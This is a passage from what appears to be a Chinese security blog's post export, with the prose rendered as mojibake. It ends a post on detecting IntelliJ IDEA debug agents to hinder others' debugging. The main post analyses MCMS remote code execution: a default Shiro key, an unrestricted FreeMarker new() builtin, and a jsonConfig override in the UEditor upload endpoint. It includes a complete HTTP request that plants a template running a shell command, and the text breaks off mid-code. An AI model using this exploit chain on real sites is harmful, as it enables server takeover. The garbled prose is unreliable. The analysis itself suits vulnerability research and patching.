123-agentlib:jdwp=transport=dt_socket,address=127.0.0.1:51362,suspend=y,server=n-javaagent:/Users/y4tacker/Library/Caches/JetBrains/IntelliJIdea2021.3/captureAgent/debugger-agent.jar-Dfile.encoding=UTF-8 æˆ‘ä»¬ä¸éš¾å‘ç°åœ¨è¿è¡Œæ—¶ä¸debugæ—¶ï¼Œæ³¨å…¥äº†ä¸åŒçš„Agentå¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸ªå·®å¼‚æ€§å»åˆ¤æ–­ç¨‹åºæ˜¯åœ¨è¿è¡Œè¿˜æ˜¯åœ¨debugï¼Œå½“ç„¶ä¸ºäº†å‡å°æ£€æµ‹çš„åŠ¨é™å¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨ManagementFactoryæ€ä¹ˆåŠï¼Ÿ è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæ—¢ç„¶æ³¨å…¥äº†ä¸åŒçš„Agenté‚£ä¹ˆå°±å¿…ç„¶åœ¨åŠ è½½æ—¶å°±æœ‰ç€ä¸åŒçš„ç±» å› æ­¤é€šè¿‡ä¸‹é¢è¿™æ ·ç®€å•çš„å‡ è¡Œä»£ç ï¼Œå°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜å•¦ 12345678try &#123; Thread.currentThread().getContextClassLoader().loadClass(&quot;com.intellij.rt.debugger.agent.CaptureAgent&quot;); System.out.println(&quot;æˆ‘åœ¨debugå‘¢&quot;);&#125;catch (java.lang.ClassNotFoundException e)&#123; Thread.currentThread().getContextClassLoader().loadClass(&quot;com.intellij.rt.ant.execution.AntMain2&quot;); System.out.println(&quot;æˆ‘æ²¡åœ¨debugå‘¢&quot;);&#125; ä¸‹é¢æ¥çœ‹çœ‹æ•ˆæœï¼Œç›´æ¥è¿è¡Œ debugè¿è¡Œ ç®€å•ä½†æ˜¯æœ‰è¶£ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥ç»“åˆä¹‹å‰æåˆ°çš„æ··æ·†æ–¹æ¡ˆï¼Œç»§ç»­ç»™IDEAåšæ›´å®šå‘çš„æŠ•æ¯’ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™æ ·ä¸€ä¸²ç®€å•çš„ä»£ç å»å°è¯•é˜»æ­¢åˆ«äººåœ¨IDEAä¸­è¿è¡Œæˆ–è€…è°ƒè¯•æˆ‘ä»¬çš„ä»£ç ","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Trick","slug":"Trick","permalink":"https://y4tacker.github.io/tags/Trick/"}]},{"title":"åˆåˆåˆæ˜¯ä¸€ä¸ªå±æ€§è¦†ç›–å¸¦æ¥çš„æ¼æ´","slug":"year/2023/12/åˆåˆåˆæ˜¯ä¸€ä¸ªå±æ€§è¦†ç›–å¸¦æ¥çš„æ¼æ´","date":"2023-12-28T13:26:01.000Z","updated":"2024-08-04T09:01:49.890Z","comments":true,"path":"2023/12/28/year/2023/12/åˆåˆåˆæ˜¯ä¸€ä¸ªå±æ€§è¦†ç›–å¸¦æ¥çš„æ¼æ´/","link":"","permalink":"https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"åˆåˆåˆæ˜¯ä¸€ä¸ªå±æ€§è¦†ç›–å¸¦æ¥çš„æ¼æ´æƒ³åˆ°æœ€è¿‘å‡ºäº†å¥½å‡ ä¸ªä¸å±æ€§è¦†ç›–æœ‰å…³çš„æ¼æ´ï¼Œçªç„¶æƒ³åˆ°æœ‰ä¸€ä¸ªå›½äº§ç³»ç»Ÿä¹Ÿæ›¾ç»å‡ºè¿‡è¿™ç±»é—®é¢˜ï¼Œæ¯”è¾ƒæœ‰è¶£è¿™é‡Œç®€å•åˆ†äº«ä¸€ä¸‹ï¼Œå¸Œæœ›æŠŠä¸€äº›ä¸œè¥¿ä¸²èµ·æ¥åˆ†äº«æ–¹ä¾¿å­¦åˆ°ä¸€äº›ä¸œè¥¿ å‰åç«¯æ¡†æ¶ä¿¡æ¯æ¢³ç†é¦–å…ˆç®€å•ä»å®˜ç½‘å¯ä»¥çœ‹å‡ºæ‰€ä½¿ç”¨çš„æ¡†æ¶ä¿¡æ¯ä»¥åŠæŠ€æœ¯é€‰å‹ https://gitee.com/mingSoft/MCMS?_from=gitee_search æˆ‘ä»¬ä¸»è¦å…³æ³¨å‡ ä¸ªç‚¹ä¸€ä¸ªæ˜¯shiroï¼Œä¸€ä¸ªæ˜¯freemarkerï¼Œè¿˜æœ‰å°±æ˜¯å…·ä½“çš„ä¸€äº›æœªé‰´æƒçš„åŠŸèƒ½ç‚¹ï¼ŒåŒæ—¶æ”¯æŒä¸¤ç§éƒ¨ç½²æ–¹å¼jar/war å…³äºè·¯ç”±çš„è¯´æ˜ï¼Œåœ¨å¯åŠ¨ç±»å½“ä¸­ï¼ŒæŒ‡å‡ºäº†æ‰«æçš„åŒ…åå‰ç¼€ä¸ºnet.mingsoft 12345678@SpringBootApplication(scanBasePackages = &#123;&quot;net.mingsoft&quot;&#125;)@MapperScan(basePackages=&#123;&quot;**.dao&quot;,&quot;com.baomidou.**.mapper&quot;&#125;)@ServletComponentScan(basePackages = &#123;&quot;net.mingsoft&quot;&#125;)public class MSApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(MSApplication.class, args); &#125;&#125; å› æ­¤ä¸è·¯ç”±ç›¸å…³å‡½æ•°åªä¼šå‡ºç°åœ¨ä¸‰ä¸ªåœ°æ–¹ æºç›®å½•ä¸‹ ms-basicä¾èµ–åŒ…ä¸‹ ms-mdiyä¾èµ–åŒ…ä¸‹ è¿™ä¸ªç³»ç»Ÿæ›¾å‡ºç°è¿‡å¾ˆå¤šæ¼æ´ï¼Œå„ç±»åå°æ–‡ä»¶ä¸Šä¼ åˆ©ç”¨ï¼Œæ³¨å…¥ã€ä»»æ„æ–‡ä»¶åˆ é™¤ç­‰ç­‰ï¼Œä½†å…¶å®éƒ½æ¯”è¾ƒé¸¡è‚‹ä¸é€‚åˆå­¦ä¹  Shiroååºåˆ—åŒ–(ç‰ˆæœ¬&lt;=5.2.8 )åœ¨å¼€å§‹å‰å…ˆç®€å•æˆ‘ä»¬çŸ¥é“shiroçš„ç‰ˆæœ¬é«˜ä½åªæ˜¯åŠ å¯†æ–¹å¼çš„æ”¹å˜ï¼Œå®é™…ä¸Šååºåˆ—åŒ–æ¼æ´ä¾ç„¶å­˜åœ¨ï¼Œå¦‚æœç³»ç»Ÿä½¿ç”¨äº†é»˜è®¤çš„keyé‚£ä¹Ÿæ˜¯å­˜åœ¨æ½œåœ¨é£é™©çš„ï¼Œè€Œæ°å¥½åœ¨MCMS&lt;=5.2.8ç‰ˆæœ¬ä¸‹éƒ½ä½¿ç”¨äº†é»˜è®¤çš„keyï¼Œä½¿ç”¨è¿™ä¸ªkeyç”Ÿæˆpayloadï¼Œç›´æ¥æ‰“CBé“¾å³å¯ æ¥ä¸‹æ¥æˆ‘ä»¬é‡ç‚¹çœ‹å¦ä¸€ä¸ªæ¼æ´ å‰å°æ¨¡æ¿SSTIRCEåˆ©ç”¨å²æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å¦ä¸€ä¸ªæ¼æ´ï¼Œå’Œæ¨¡æ¿ç›¸å…³çš„æ¼æ´ å› ä¸ºè¿™é‡Œçš„æ¨¡æ¿æ¸²æŸ“ä½¿ç”¨äº†freemarkerï¼Œæˆ‘ä»¬ä¾¿æœ‰ä¸¤ä¸ªæ€è·¯ï¼š ç‰ˆæœ¬æ˜¯å¦åœ¨æ¼æ´ç‰ˆæœ¬ å†™æ³•æ˜¯å¦å®‰å…¨ åœ¨MCMSä¸­å…³äºæ¨¡æ¿çš„æ¸²æŸ“å¤„ç†ï¼Œæ˜¯é€šè¿‡å°è£…äº†ä¸€ä¸ªå·¥å…·ç±»åšçš„å¤„ç†ï¼Œåœ¨ä¾èµ–åŒ…ms-mdiyä¸­çš„net.mingsoft.mdiy.util.ParserUtil#renderingåšå¤„ç† MCMSæ˜¯åœ¨5.1ç‰ˆæœ¬å¼€å§‹ä½¿ç”¨freemarkeråšæ¨¡æ¿æ¸²æŸ“ï¼Œå¹¶ä¸”ç‰ˆæœ¬ä¸€ç›´æ²¡æœ‰æ”¹å˜è¿‡ï¼Œä¼ å®¶å®&quot;2.3.31&quot; å¯¹äºfreemarkerçš„æ¨¡æ¿ï¼Œé€šå¸¸æ˜¯é€šè¿‡apiä¸newè¿›è¡Œçš„åˆ©ç”¨ï¼Œå½“ç„¶ä¹Ÿæœ‰åˆ©ç”¨é™åˆ¶ å¯¹äºå†…ç½®å‡½æ•°api api_builtin_enabledä¸ºtrueæ—¶æ‰å¯ä½¿ç”¨apiå‡½æ•°ï¼Œè€Œè¯¥é…ç½®åœ¨2.3.22ç‰ˆæœ¬ä¹‹åé»˜è®¤ä¸ºfalse å¯¹äºå†…ç½®å‡½æ•°new ä» 2.3.17ç‰ˆæœ¬ä»¥åï¼Œå®˜æ–¹ç‰ˆæœ¬æä¾›äº†ä¸‰ç§TemplateClassResolverå¯¹ç±»è¿›è¡Œè§£æï¼š 1ã€UNRESTRICTED_RESOLVERï¼šå¯ä»¥é€šè¿‡ ClassUtil.forName(className) è·å–ä»»ä½•ç±»ã€‚ 2ã€SAFER_RESOLVERï¼šä¸èƒ½åŠ è½½ freemarker.template.utility.JythonRuntimeã€freemarker.template.utility.Executeã€freemarker.template.utility.ObjectConstructorè¿™ä¸‰ä¸ªç±»ã€‚ 3ã€ALLOWS_NOTHING_RESOLVERï¼šä¸èƒ½è§£æä»»ä½•ç±»ã€‚ å¯é€šè¿‡freemarker.core.Configurable#setNewBuiltinClassResolveræ–¹æ³•è®¾ç½®TemplateClassResolverï¼Œä»è€Œé™åˆ¶é€šè¿‡new()å‡½æ•°å¯¹freemarker.template.utility.JythonRuntimeã€freemarker.template.utility.Executeã€freemarker.template.utility.ObjectConstructorè¿™ä¸‰ä¸ªç±»çš„è§£æ å°½ç®¡MCMSçš„æ¼æ´ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯ä»–åœ¨5.8ç‰ˆæœ¬ä»¥ä¸‹å¹¶æœªå¯¹å†…ç½®å‡½æ•°newåšä¸¥æ ¼é™åˆ¶ï¼Œå…·ä½“æˆ‘ä»¬å¯ä»¥çœ‹çœ‹net.mingsoft.mdiy.util.ParserUtil#rendering 1234567891011public static String rendering(Map root, String content) throws IOException, TemplateException &#123; Configuration cfg = new Configuration(Configuration.VERSION_2_3_0); StringTemplateLoader stringLoader = new StringTemplateLoader(); stringLoader.putTemplate(&quot;template&quot;, content); cfg.setNumberFormat(&quot;#&quot;); cfg.setTemplateLoader(stringLoader); Template template = cfg.getTemplate(&quot;template&quot;, &quot;utf-8&quot;); StringWriter writer = new StringWriter(); template.process(root, writer); return writer.toString();&#125; è™½ç„¶åœ¨freemarkerç‰ˆæœ¬åœ¨è¾ƒå®‰å…¨çš„ç‰ˆæœ¬ï¼Œä½†å¹¶æœªé…ç½®new-builtin-class-resolverï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°è°ƒç”¨çš„ç‚¹å³å¯ åœ¨é«˜ç‰ˆæœ¬å5.2.9ï¼Œå¼€å‘è€…ç»ˆäºæ„è¯†åˆ°è¿™ä¸ªé—®é¢˜ï¼Œè®¾ç½®äº†cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); å›åˆ°æ­£é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆä»è¾ƒä½çš„ç‰ˆæœ¬è¯´èµ·ï¼Œä»¥5.2.5æ¥åšä¾‹å­ V&lt;=5.2.5é¦–å…ˆæ˜¯ä¸€ä¸ªèƒ½ä»»æ„æ§åˆ¶æ¨¡æ¿æ¸²æŸ“çš„å‡½æ•° è¿™ä¸ªè·¯ç”±éå¸¸å¥½æ‰¾ï¼Œå°±åœ¨æºç è·¯å¾„ä¸‹ä¸ºæ•°ä¸å¤šä¸æ˜¯CRUDåŠŸèƒ½çš„ç±»ä¸­net.mingsoft.cms.action.web.MCmsAction#search 123456789101112131415161718192021222324252627/** * å®ç°å‰ç«¯é¡µé¢çš„æ–‡ç« æœç´¢ * * @param request æœç´¢id * @param response */ @RequestMapping(value = &quot;search&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;) @ResponseBody public String search(HttpServletRequest request, HttpServletResponse response) &#123; String search = BasicUtil.getString(&quot;tmpl&quot;, &quot;search.htm&quot;); ............ //è§£æåçš„å†…å®¹ String content = &quot;&quot;; try &#123; //æ ¹æ®æ¨¡æ¿è·¯å¾„ï¼Œå‚æ•°ç”Ÿæˆ content = ParserUtil.rendering(search, params); &#125; catch (TemplateNotFoundException e) &#123; e.printStackTrace(); &#125; catch (MalformedTemplateNameException e) &#123; e.printStackTrace(); &#125; catch (ParseException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return content; &#125; å¯ä»¥è¿™é‡Œé€šè¿‡tmplå‚æ•°èƒ½å®ç°æ¸²æŸ“æ–‡ä»¶çš„å®Œå…¨æ§åˆ¶ï¼Œä½†æ˜¯ åœ¨ParserUtil.getPageSize(search, 20)å½“ä¸­æˆ‘ä»¬ä¼šå‘ç°ï¼Œå…¶è¯»å–æ–‡ä»¶è¿‡ç¨‹ä¸­ä½¿ç”¨äº†hutoolçš„FileUtil.file,åœ¨è¿™ä¸ªç¬¬ä¸‰æ–¹å·¥å…·ç±»ä½¿ç”¨äº†checkSlipé˜²æ­¢ç›®å½•ç©¿è¶Šï¼Œå› æ­¤éå¸¸å¯æƒœæˆ‘ä»¬ç°åœ¨èƒ½æ¸²æŸ“ä»»æ„è·¯å¾„ä¸‹çš„æ–‡ä»¶äº† 123456789101112131415161718public static File checkSlip(File parentFile, File file) throws IllegalArgumentException &#123; if (null != parentFile &amp;&amp; null != file) &#123; String parentCanonicalPath; String canonicalPath; try &#123; parentCanonicalPath = parentFile.getCanonicalPath(); canonicalPath = file.getCanonicalPath(); &#125; catch (IOException var5) &#123; throw new IORuntimeException(var5); &#125; if (!canonicalPath.startsWith(parentCanonicalPath)) &#123; throw new IllegalArgumentException(&quot;New file is outside of the parent dir: &quot; + file.getName()); &#125; &#125; return file;&#125; é‚£è¦æƒ³å®ç°ï¼Œé‚£å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶ä»»æ„è·¯å¾„ä¸Šä¼ ï¼Œæˆ–è€…èƒ½å¤Ÿé…åˆç›®å½•ç©¿è¶Šè·³è½¬çš„ä¸Šä¼ ç‚¹ï¼Œè¿™ä¸ªç³»ç»Ÿä¸­æ­£å¥½å°±æœ‰ï¼Œåœ¨net.mingsoft.basic.action.web.EditorAction#editorä¸­ï¼Œå‚æ•°ä¼ å…¥åäº¤ç»™äº†MsUeditorActionEnterç±»ç»§ç»­å¤„ç† 12345678910111213141516171819202122232425262728293031323334353637public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) &#123; String rootPath = BasicUtil.getRealPath(&quot;&quot;); File saveFloder = new File(this.uploadFloderPath); if (saveFloder.isAbsolute()) &#123; rootPath = saveFloder.getPath(); jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;&quot;); &#125; else &#123; jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;/&quot; + this.uploadFloderPath); &#125; String json = (new MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(&quot;&quot;))).exec(); if (saveFloder.isAbsolute()) &#123; Map data = (Map)JSON.parse(json); data.put(&quot;url&quot;, this.uploadMapping.replace(&quot;/**&quot;, &quot;&quot;) + data.get(&quot;url&quot;)); return JSON.toJSONString(data); &#125; else &#123; return json; &#125;&#125;public MsUeditorActionEnter(HttpServletRequest request, String rootPath, String jsonConfig, String configPath) &#123; super(request, rootPath); if (jsonConfig != null &amp;&amp; !jsonConfig.trim().equals(&quot;&quot;) &amp;&amp; jsonConfig.length() &gt;= 0) &#123; this.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI())); ConfigManager config = this.getConfigManager(); setValue(config, &quot;rootPath&quot;, rootPath); JSONObject _jsonConfig = new JSONObject(jsonConfig); JSONObject jsonObject = config.getAllConfig(); Iterator iterator = _jsonConfig.keys(); while(iterator.hasNext()) &#123; String key = (String)iterator.next(); jsonObject.put(key, _jsonConfig.get(key)); &#125; &#125;&#125; åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œå…ˆåˆå§‹åŒ–äº†çˆ¶ç±»ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼ŒactionTypeå—æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ§åˆ¶ï¼Œè¿™ä¸ªå‚æ•°å†³å®šäº†æ–¹æ³•çš„è°ƒç”¨ 1234567public ActionEnter(HttpServletRequest request, String rootPath) &#123; this.request = request; this.rootPath = rootPath; this.actionType = request.getParameter(&quot;action&quot;); this.contextPath = request.getContextPath(); this.configManager = ConfigManager.getInstance(this.rootPath, this.contextPath, request.getRequestURI());&#125; æ¥ä¸‹æ¥å›åˆ°MsUeditorActionEnteræ„é€ å‡½æ•°å¤„ç†è¿‡ç¨‹ï¼Œç´§æ¥ç€è°ƒç”¨äº†this.getConfigManager()åˆå§‹åŒ–ä¸€äº›ä¸Šä¼ é…ç½®ï¼Œè€Œè¿™ä¸ªé…ç½®æ¥æºäºæ–‡ä»¶static/plugins/ueditor/1.4.3.3/jsp/config.jsonï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶å¯¹ä¸Šä¼ åšäº†é™åˆ¶ï¼ŒåŒ…æ‹¬ä¿å­˜æ–‡ä»¶è·¯å¾„æ¨¡æ¿ã€å¤§å°ã€å…è®¸çš„åç¼€ç­‰ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±çœ‹çœ‹è¿™ä¸ªåˆå§‹åŒ–è¿‡ç¨‹ï¼Œå› ä¸ºä¸å¤ªå…³é”®è¿™é‡Œå°±ä¸å¤šå™è¿° åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªå‚æ•°è¦†ç›–çš„é—®é¢˜(jsonConfigæ¥æºäºwebå‚æ•°)ï¼Œå¯ä»¥ç”±è‡ªå®šä¹‰çš„è¾“å…¥è¦†ç›–é»˜è®¤é…ç½®ï¼Œå…·ä½“è¦†ç›–ä»€ä¹ˆé…ç½®å¾…ä¼šå„¿ä¼šè¯´ 1234567891011121314151617public MsUeditorActionEnter(HttpServletRequest request, String rootPath, String jsonConfig, String configPath) &#123; super(request, rootPath); if (jsonConfig != null &amp;&amp; !jsonConfig.trim().equals(&quot;&quot;) &amp;&amp; jsonConfig.length() &gt;= 0) &#123; this.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI())); ConfigManager config = this.getConfigManager(); setValue(config, &quot;rootPath&quot;, rootPath); JSONObject _jsonConfig = new JSONObject(jsonConfig); JSONObject jsonObject = config.getAllConfig(); Iterator iterator = _jsonConfig.keys(); while(iterator.hasNext()) &#123; String key = (String)iterator.next(); jsonObject.put(key, _jsonConfig.get(key)); &#125; &#125;&#125; æ¥ä¸‹æ¥åˆå§‹åŒ–åè°ƒç”¨execæ–¹æ³•ï¼Œè¿™é‡Œcallbackæ˜¯å¦ä¼ å…¥å¯¹æˆ‘ä»¬ä¸æ˜¯å¾ˆé‡è¦ï¼Œç»§ç»­çœ‹invokeæ–¹æ³• æ ¹æ®æˆ‘ä»¬ä¹‹å‰ä¼ å…¥çš„actionTypeå†³å®šèµ°å…¥å“ªä¸ªåˆ†æ”¯ å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰8ç§ç±»å‹ï¼Œå¯¹åº”äº†ä¸åŒçš„æ¼æ´ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬åªå…³å¿ƒRCEï¼Œæ‰€ä»¥è¿™é‡Œå°±ä»¥ä¸Šä¼ ä¸ºä¾‹ï¼Œé€‰æ‹©uploadfile 12345678this.put(&quot;config&quot;, 0);this.put(&quot;uploadimage&quot;, 1);this.put(&quot;uploadscrawl&quot;, 2);this.put(&quot;uploadvideo&quot;, 3);this.put(&quot;uploadfile&quot;, 4);this.put(&quot;catchimage&quot;, 5);this.put(&quot;listfile&quot;, 6);this.put(&quot;listimage&quot;, 7); åœ¨ä¹‹åè°ƒç”¨(new Uploader(this.request, conf)).doExec()åšå¤„ç†ï¼Œè¿™é‡Œçš„å‚æ•°èµ°å‘æˆ‘ä»¬åŒæ ·ä¸åœ¨ä¹éšä¾¿é€‰æ‹©ä¸€ä¸ªå³å¯ 1234567891011public final State doExec() &#123; String filedName = (String)this.conf.get(&quot;fieldName&quot;); State state = null; if (&quot;true&quot;.equals(this.conf.get(&quot;isBase64&quot;))) &#123; state = Base64Uploader.save(this.request.getParameter(filedName), this.conf); &#125; else &#123; state = BinaryUploader.save(this.request, this.conf); &#125; return state;&#125; çœç•¥å…¶ä¸­çš„ä¸å…³é”®çš„éƒ¨åˆ†ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨æœ€ç»ˆä¿å­˜è·¯å¾„çš„ç”Ÿæˆå³å¯ 12345678910111213141516171819202122...String savePath = (String)conf.get(&quot;savePath&quot;);String originFileName = fileStream.getName();String suffix = FileType.getSuffixByFilename(originFileName);originFileName = originFileName.substring(0, originFileName.length() - suffix.length());savePath = savePath + suffix;long maxSize = (Long)conf.get(&quot;maxSize&quot;);if (!validType(suffix, (String[])((String[])conf.get(&quot;allowFiles&quot;)))) &#123; return new BaseState(false, 8);&#125; else &#123; savePath = PathFormat.parse(savePath, originFileName); String physicalPath = (String)conf.get(&quot;rootPath&quot;) + savePath; InputStream is = fileStream.openStream(); State storageState = StorageManager.saveFileByInputStream(is, physicalPath, maxSize); is.close(); if (storageState.isSuccess()) &#123; storageState.putInfo(&quot;url&quot;, PathFormat.format(savePath)); storageState.putInfo(&quot;type&quot;, suffix); storageState.putInfo(&quot;original&quot;, originFileName + suffix); &#125;&#125;... ä»é…ç½®è·å–ä¿å­˜çš„è·¯å¾„ ä»Multipartè§£ææ–‡ä»¶åç¼€æ‹¼æ¥ ä½¿ç”¨PathFormat.parseå¤„ç†æ›¿æ¢æ¨¡æ¿æ ‡ç­¾å†…å®¹ ä¸æ ¹è·¯å¾„æ‹¼æ¥å¹¶å†™å…¥æ–‡ä»¶ åœ¨com.baidu.ueditor.PathFormat#parseçš„å¤„ç†è¿‡ç¨‹å½“ä¸­ä¼šå¯¹filenameä¸­å­—ç¬¦åšæ›¿æ¢ï¼Œå¯¼è‡´/å­—ç¬¦ä¸¢å¤±å› æ­¤ä¸èƒ½ä»filenameæ§åˆ¶è·¯å¾„çš„ç©¿è¶Š 1filename = filename.replace(&quot;$&quot;, &quot;\\\\$&quot;).replaceAll(&quot;[\\\\/:*?\\&quot;&lt;&gt;|]&quot;, &quot;&quot;); å› æ­¤æˆ‘ä»¬åªèƒ½é€šè¿‡æ§åˆ¶savePathå®ç°å®Œæ•´çš„è·¯å¾„æ§åˆ¶(è¿˜è®°å¾—ä¹ˆï¼Œä¸Šé¢ä¸€å¼€å§‹æåˆ°è¿‡å¯ä»¥åšå‚æ•°è¦†ç›–)ï¼Œå¯¹äºæˆ‘ä»¬çš„uploadfileçš„actionï¼Œå¯¹åº”çš„savepathå±æ€§ä¸ºfilePathFormatï¼Œå› æ­¤æ„é€ ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è¦†ç›–å…¶ä»–å±æ€§å‚æ•°è¿™é‡Œä¸é‡å¤ 12345678910111213141516Ps:&#123;&#123;url()&#125;æ˜¯yakitçš„urlç¼–ç çš„æ ‡ç­¾POST /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=&#123;&#123;url(&#123;filePathFormat:&#x27;/template/1/default/2&#x27;&#125;)&#125;&#125;&amp;action=uploadfile HTTP/1.1Host: 127.0.0.1:8079Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Length: 362Content-Type: multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36X_Requested_With: UTF-8--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.txt&quot;&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -na Calculator&quot;)&#125;--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA-- V&lt;=5.2.8æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¼€å‘æ˜¯å¦‚ä½•ä¿®å¤è¿™ä¸ªé—®é¢˜çš„ï¼Œè¿™é‡Œæˆ‘çš„ç¯å¢ƒæ˜¯5.2.8ï¼Œè¿™ä¸€æ¬¡å¼€å‘æ„è¯†åˆ°äº†é—®é¢˜æ‰€åœ¨ï¼Œåšäº†ä¸¤ä¸ªæ­¥éª¤çš„ä¿®å¤ rootPathç”±ç¨‹åºæ§åˆ¶åœ¨å¿…é¡»ä¸ºuploadç›®å½•ä¸‹ å¯¹æ¯ä¸€ä¸ªè·¯å¾„é…ç½®åšäº†ä¸€æ¬¡è·¯å¾„å½’ä¸€åŒ– 123456789101112131415161718192021public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) &#123; String uploadFloderPath = MSProperties.upload.path; String rootPath = BasicUtil.getRealPath(uploadFloderPath); jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;/&quot; + uploadFloderPath); Map&lt;String, Object&gt; map = (Map)JSONObject.parse(jsonConfig); String imagePathFormat = (String)map.get(&quot;imagePathFormat&quot;); imagePathFormat = FileUtil.normalize(imagePathFormat); String filePathFormat = (String)map.get(&quot;filePathFormat&quot;); filePathFormat = FileUtil.normalize(filePathFormat); String videoPathFormat = (String)map.get(&quot;videoPathFormat&quot;); videoPathFormat = FileUtil.normalize(videoPathFormat); map.put(&quot;imagePathFormat&quot;, imagePathFormat); map.put(&quot;filePathFormat&quot;, filePathFormat); map.put(&quot;videoPathFormat&quot;, videoPathFormat); jsonConfig = JSONObject.toJSONString(map); MsUeditorActionEnter actionEnter = new MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(&quot;&quot;)); String json = actionEnter.exec(); Map jsonMap = (Map)JSON.parseObject(json, Map.class); jsonMap.put(&quot;url&quot;, &quot;/&quot;.concat(uploadFloderPath).concat(jsonMap.get(&quot;url&quot;) + &quot;&quot;)); return JSONObject.toJSONString(jsonMap);&#125; é‚£æ˜¯ä¸æ˜¯å°±æ²¡åŠæ³•äº†å‘¢ï¼Ÿè¯·ç‹¬ç«‹æ€è€ƒä¸‰åˆ†é’Ÿ ä¹‹å‰æåˆ°äº†åœ¨PathFormat.parseå½“ä¸­ï¼Œæœ‰å¯¹æœ€ç»ˆè·¯å¾„å½“ä¸­çš„æ¨¡æ¿åšæ›¿æ¢(å½“ç„¶è¿™é‡Œå’Œè€ç‰ˆæœ¬çš„é€»è¾‘ä¸ä¸€æ ·ï¼Œç®€åŒ–äº†å¾ˆå¤šï¼Œåˆ†ææ—¶ä»¥å½“å‰ç‰ˆæœ¬ä¸ºå‡†ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹è€ç‰ˆ)ï¼Œå¯ä»¥çœ‹åˆ°ä¼šå–{xxx}ä¸­çš„å†…å®¹ï¼Œä¹‹åè°ƒç”¨getStringåšæ›¿æ¢ 1234567891011121314151617181920public static String parse(String input, String filename) &#123; Pattern pattern = Pattern.compile(&quot;\\\\&#123;([^\\\\&#125;]+)\\\\&#125;&quot;, 2); Matcher matcher = pattern.matcher(input); String matchStr = null; currentDate = new Date(); StringBuffer sb = new StringBuffer(); while(matcher.find()) &#123; matchStr = matcher.group(1); if (matchStr.indexOf(&quot;filename&quot;) != -1) &#123; filename = filename.replace(&quot;$&quot;, &quot;\\\\$&quot;).replaceAll(&quot;[\\\\/:*?\\&quot;&lt;&gt;|]&quot;, &quot;&quot;); matcher.appendReplacement(sb, filename); &#125; else &#123; matcher.appendReplacement(sb, getString(matchStr)); &#125; &#125; matcher.appendTail(sb); return sb.toString();&#125; å¯ä»¥çœ‹åˆ°å¦‚æœå­—ç¬¦ä¸åœ¨å½“å‰çš„caseå½“ä¸­ä¼šç›´æ¥è¿”å› 12345678910111213141516171819202122private static String getString(String pattern) &#123; pattern = pattern.toLowerCase(); if (pattern.indexOf(&quot;time&quot;) != -1) &#123; return getTimestamp(); &#125; else if (pattern.indexOf(&quot;yyyy&quot;) != -1) &#123; return getFullYear(); &#125; else if (pattern.indexOf(&quot;yy&quot;) != -1) &#123; return getYear(); &#125; else if (pattern.indexOf(&quot;mm&quot;) != -1) &#123; return getMonth(); &#125; else if (pattern.indexOf(&quot;dd&quot;) != -1) &#123; return getDay(); &#125; else 